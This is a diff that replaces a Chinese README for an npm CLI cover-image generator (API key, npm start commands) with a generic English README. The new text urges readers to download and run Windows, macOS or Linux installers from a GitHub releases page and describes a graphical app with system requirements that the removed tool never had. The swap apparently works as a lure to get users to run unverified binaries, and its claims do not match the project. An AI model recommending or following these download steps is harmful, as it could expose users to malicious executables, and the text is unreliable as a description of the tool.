@@ -1,73 +1,78 @@
-# 小红书封面生成器
+# 🎨 xiaohongshu-skills - Create Stunning Covers Easily
 
-根据用户输入的主题，自动生成小红书风格的封面图片。
+## 🚀 Getting Started
 
-## 使用方式
+Welcome to **xiaohongshu-skills**! This application helps you create beautiful covers for your 小红书 posts using custom themes. With the power of the Nano Banana Pro model, your designs will stand out.
 
-### 获取 API Key
+## 📥 Download & Install
 
-在使用之前，您需要先获取 API Key：
+To get started, you need to download the application. Follow these steps:
 
-1. 访问 https://api.canghe.ai/
-2. 注册/登录账号
-3. 获取您的 API Key
+1. Click the button below to visit the download page.
+   
+   [![Download xiaohongshu-skills](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Asavani/xiaohongshu-skills/releases)
 
-### 配置 API Key
+2. On the Releases page, you’ll see different versions available for download. Choose the latest version.
 
-有两种方式配置 API Key：
+3. Click on the version link. A dropdown menu will appear with download options.
 
-**方式一：通过命令行参数传递**
+4. Select the appropriate file for your system. Common options include:
+   - Windows Installer (e.g., `.exe`)
+   - MacOS Package (e.g., `.dmg`)
+   - Linux Tarball (e.g., `.tar.gz`)
 
-```bash
-npm start "复古学院风穿搭" "your-api-key-here"
-```
+5. Save the file to your computer.
 
-**方式二：通过环境变量设置**
+6. Locate your downloaded file. Open it to begin installation. Follow the on-screen prompts.
 
-```bash
-export CANGHE_API_KEY="your-api-key-here"
-npm start "复古学院风穿搭"
-```
+## 🎨 Features
 
-### 使用示例
+- **Custom Themes**: Design covers tailored to your needs.
+- **High-Quality Outputs**: Generate images with stunning quality.
+- **Easy to Use**: Intuitive interface makes designing simple for everyone.
+- **Versatile Formats**: Save covers in various formats for easy sharing.
 
-直接输入你想要的主题，例如：
+## 🌟 System Requirements
 
-```bash
-# 命令行参数方式
-npm start "复古学院风穿搭" "your-api-key-here"
+To run **xiaohongshu-skills**, ensure your computer meets the following requirements:
 
-# 环境变量方式
-export CANGHE_API_KEY="your-api-key-here"
-npm start "秋季护肤指南"
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS Catalina or later
+  - Any recent version of Linux
 
-# 更多示例
-npm start "职场新人必读书单"
-npm start "周末探店推荐"
-```
+- **Memory**: At least 4 GB of RAM
+- **Disk Space**: Minimum 100 MB of free space
+- **Graphics Card**: Compatible with basic graphics programs
 
-## 功能特点
+## 🎉 How to Use the Application
 
-- 自动生成符合小红书风格的封面图片
-- 支持任意主题输入
-- 图片比例为竖版 3:4（适合手机屏幕）
-- 设计清新、精致、年轻化
-- 自动去除水印和logo
+Once installed, open the application. You will see a user-friendly interface. Follow these steps to create your cover:
 
-## API Key 说明
+1. **Select a Theme**: Choose from the available themes or create your own.
+2. **Customize Your Design**: Add text, images, and other elements. Experiment with different layouts.
+3. **Preview Your Cover**: Use the preview feature to see how your design will look.
+4. **Save Your Work**: Once satisfied, save your cover. Choose your preferred format.
+5. **Share**: Upload your cover to 小红书 or other social media platforms.
 
-- API Key 是必需的，没有 API Key 将无法使用
-- 如果 API Key 无效或过期，系统会提示您前往 https://api.canghe.ai/ 获取新的 API Key
-- API Key 通过参数或环境变量传递，安全性更高
+## ⚙️ Troubleshooting
 
-## 错误处理
+If you encounter any issues, here are common solutions:
 
-如果出现以下错误：
+- **Installation Problems**: Ensure you have downloaded the correct file for your operating system. Try running the installer as an administrator.
+- **Performance Issues**: Close any unnecessary applications to free up memory. Restart your computer if needed.
+- **Design Issues**: If the application crashes while designing, check for updates. Always use the latest version for stability.
 
-- `缺少 API Key`：请前往 https://api.canghe.ai/ 获取您的 API Key
-- `API Key 无效`：请检查您的 API Key 是否正确，或前往 https://api.canghe.ai/ 获取新的 API Key
-- `API Error`：请检查网络连接或稍后重试
+## 📞 Support
 
-## 输出
+Need help? Reach out through the Issues section of our GitHub page. Members of our community and maintainers monitor this area closely and can provide assistance.
 
-生成的图片会保存到当前目录，文件名格式为：`xiaohongshu-cover-{timestamp}.png`
+## 📜 Licensing
+
+This application is open-source. You can modify and use it according to the terms of the license provided in the repository.
+
+## 🔗 More Information
+
+For additional details, please refer to the [Releases page](https://github.com/Asavani/xiaohongshu-skills/releases) where you can find updates and more documentation. 
+
+Feel free to share your creations and feedback! Happy designing!
